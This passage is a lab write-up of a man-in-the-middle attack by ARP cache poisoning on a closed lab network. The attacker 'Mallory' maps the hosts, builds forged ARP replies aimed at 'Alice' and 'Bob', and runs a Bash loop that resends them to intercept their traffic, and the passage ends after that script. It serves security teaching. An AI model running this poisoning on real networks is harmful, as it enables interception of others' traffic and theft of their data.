## 1. Introduction
The objective of this lab was to perform a Man-in-the-Middle (MITM) attack within a switched Ethernet network. Acting as the attacker "Mallory," the goal was to intercept traffic between two other nodes, "Alice" and "Bob," to steal a secret flag. This was achieved using **ARP Spoofing** (also known as ARP Cache Poisoning).

## 2. Network Reconnaissance
The first step was to identify the targets on the local network (interface `eth1`).
* **Method:** I used `ifconfig` to identify my own details and `ping` sweeps combined with `arp` cache inspection to identify Alice and Bob.
* **Findings:**

| Role | IP Address | MAC Address (Hardware) |
| :--- | :--- | :--- |
| **Mallory (Attacker)** | `10.10.49.4` | `02:42:0a:0a:31:04` |
| **Alice (Victim)** | `10.10.49.2` | `02:42:0a:0a:31:02` |
| **Bob (Target)** | `10.10.49.3` | `02:42:0a:0a:31:03` |

## 3. Attack Strategy: ARP Spoofing
To become the "Man in the Middle," I needed to poison the ARP cache of both victims.
1.  **Poisoning Alice:** I sent a forged ARP Reply telling Alice that **Bob's IP** is at **Mallory's MAC**.
2.  **Poisoning Bob:** I sent a forged ARP Reply telling Bob that **Alice's IP** is at **Mallory's MAC**.

### 3.1 Payload Construction
Using the provided `raw_packet` tool and `hexedit`, I constructed two binary payload files containing the raw hex bytes for the spoofed Ethernet/ARP frames.

**Payload 1: `spoof_alice` (Trick Alice)**
* **Sender MAC:** `02:42:0a:0a:31:04` (Mallory - The Trap)
* **Sender IP:** `10.10.49.3` (Bob - The Lie)
* **Target:** Alice

**Payload 2: `spoof_bob` (Trick Bob)**
* **Sender MAC:** `02:42:0a:0a:31:04` (Mallory - The Trap)
* **Sender IP:** `10.10.49.2` (Alice - The Lie)
* **Target:** Bob

## 4. Execution
Because ARP cache entries expire quickly (often within seconds), a single packet is insufficient. I created a Bash script to continuously send these spoofed packets.

**Script: `mitm.sh`**
```bash
#!/bin/bash
echo "Starting MITM Attack..."
while true; do
    # Tell Alice I am Bob
    sudo ./raw_packet eth1 02:42:0a:0a:31:02 0x0806 spoof_alice
    # Tell Bob I am Alice
    sudo ./raw_packet eth1 02:42:0a:0a:31:03 0x0806 spoof_bob
    sleep 2
done

